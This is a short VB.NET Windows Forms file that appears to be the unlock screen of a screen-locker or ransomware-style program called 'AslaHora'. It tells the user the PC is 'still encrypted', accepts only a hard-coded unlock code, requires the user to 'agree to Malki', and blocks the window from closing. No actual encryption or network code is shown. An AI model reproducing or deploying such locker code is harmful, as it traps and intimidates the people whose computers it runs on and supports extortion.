﻿Imports System.Net.Mail

Public Class Form2

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If CheckBox1.Checked = True Then
            If TextBox1.Text = "MALKIMALKIMALKI" Then
                MsgBox("PC Unlocked By Malki!", MsgBoxStyle.Information, "AslaHora")
                Me.Hide()
                Form3.Show()
            Else
                MsgBox("You are still encrypted because the unlock code is invalid.", MsgBoxStyle.Critical, "Still Encrypted!!!")
            End If
        Else
            MsgBox("You are still encrypted because you don't agree to Malki.", MsgBoxStyle.Critical, "Still Encrypted!!!")
        End If
    End Sub

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Cursor.Show()
    End Sub
End Class